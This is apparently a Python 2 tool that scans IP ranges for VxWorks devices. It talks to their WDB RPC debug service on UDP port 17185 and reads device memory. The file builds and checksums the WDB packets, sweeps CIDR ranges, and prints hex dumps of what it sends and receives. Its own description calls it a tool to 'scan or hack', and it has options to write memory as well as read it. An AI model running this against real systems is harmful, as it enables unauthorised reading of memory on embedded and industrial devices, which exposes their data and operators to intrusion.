__author__ = 'qmwang'
from struct import pack, unpack
import socket
import struct
import sys
import random

from optparse import OptionGroup, OptionParser
import string
from scapy.utils import hexdump
import time

__FILTER = "".join([' '] + [' ' if chr(x) not in string.printable or chr(x)
                            in string.whitespace else chr(x) for x in range(1, 256)])

SEQNO = 0


def StringPrintable(msg):
    return msg.translate(__FILTER)


def get_ip_list(mask):
    try:
        net_addr, mask = mask.split('/')
        mask = int(mask)
        start, = struct.unpack('!L', socket.inet_aton(net_addr))
        start &= 0xFFFFFFFF << (32 - mask)
        end = start | (0xFFFFFFFF >> mask)
        return [socket.inet_ntoa(struct.pack('!L', addr)) for addr in range(start + 1, end)]
    except(struct.error, socket.error):
        return []


def pre_scan(argv):
    parser = OptionParser(
        usage="usage: %prog [options] [ip]...",
        description="Scan or hack IP range for VxWorks devices."
    )
    parser.add_option("--host-list", dest="hosts_file",
                      help="Scan hosts from file", metavar="FILE")
    parser.add_option("--ports", dest="ports",
                      help="Scan ports", metavar="PORTS", default=17185)
    parser.add_option("--timeout", dest="connect_timeout",
                      help="Connection timeout(seconds)", metavar="TIMEOUT", type="float", default=1)
    parser.add_option("-s", "--scan", help="Scan VxWorks devices",
                      default=True, action="store_true")
    parser.add_option("-r", "--read", help="Read VxWorks memory",
                      default=True, action="store_true")
    parser.add_option("-w", "--write", help="Write VxWorks memory",
                      default=True, action="store_true")

    (options, args) = parser.parse_args(argv)

    scan_hosts = []
    if options.hosts_file:
        try:
            scan_hosts = [file.strip()
                          for file in open(options.hosts_file, 'r')]
        except IOError:
            print "Can't open file %s" % options.hosts_file

    for ip in args:
        scan_hosts.extend(get_ip_list(ip) if '/' in ip else [ip])

    scan_ports = options.ports

    if not scan_hosts:
        print "No targets to scan\n\n"
        parser.print_help()
        exit()

    print 'Scan start...\n'
    for host in scan_hosts:
        splitted = host.split(":")
        host = splitted[0]
        if len(splitted) == 2:
            ports = [int(splitted[1])]
        else:
            ports = scan_ports
        port = ports
        print host + ':' + str(port)

        scan(host, port, options)


class WdbrpcPacket:

    def __init__(self, procedure=0, data=''):
        self.procedure = procedure
        self.data = data

    def pack(self):
        pkt = pack('!10L',
                   0x00000000,  # random.randint(0, 0x10000000),
                   0x00000000,
                   0x00000002,
                   0x55555555,
                   0x00000001,
                   self.procedure,
                   0x00000000,
                   0x00000000,
                   0x00000000,
                   0x00000000
                   )
        pkt += pack('!3L',
                    0x00000000,  # 0xffff,
                    # self.wdbrpc_checksum()
                    0x00000000,
                    self.wdbrpc_req_seqno()
                    )
        pkt += self.data
        pktlist = list(pkt)
        pktlist[44: 48] = pack('!L', len(pkt) - 4)
        pktlist[42: 44] = pack('!H', self.wdbrpc_checksum(pktlist))
        pktlist[40: 42] = pack('!H', 0xffff)
        pktlist[0: 4] = pack('!L', random.randint(0, 0x100000000))
        return ''.join(pktlist)

    def wdbrpc_req_seqno(self):
        global SEQNO
        SEQNO = SEQNO + 1
        return SEQNO 

    def wdbrpc_checksum(self, data):
        sum = 0
        i = 0
        checklist = list()
        while(i < (len(data) - 1)):
            checklist.append(ord(data[i]) * 256 + ord(data[i + 1]))
            i += 2
        for n in checklist:
            sum += n
        sum = (sum & 0xffff) + (sum >> 16)
        return (~sum) & 0xffff


class Wdbrpc:

    def __init__(self, ip, port=17185, timeout=8):
        self.ip = ip
        self.port = port
        self.timeout = timeout

        self.addr = (ip, port)

    def wdbrpc_request(self, procedure, data):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        pkt = WdbrpcPacket(procedure, data).pack()
        print "------------send"
        print hexdump(pkt)

        sock.sendto(pkt, self.addr)
        recvdata, addr = sock.recvfrom(4096)
        print "------------recv"
        print hexdump(recvdata)
        return recvdata

    def wdbrpc_connect(self):
        data = pack('!3L', 0x00000002, 0x000000000, 0x000000000)
        recv = self.wdbrpc_request(1, data)

    def wdbrpc_request_memread(self, offset=0, length=512, params=0):
        data = pack('!3L',
                    offset,
                    length,
                    params
                    )
        self.wdbrpc_request(10, data)

    


def scan(host, port, options):
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_connect()
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_request_memread(0x100000+0x1200, 512)

if __name__ == "__main__":
    try:
        pre_scan(sys.argv[1:])
        #scan()
    except KeyboardInterrupt:
        print "Scan terminated\n"
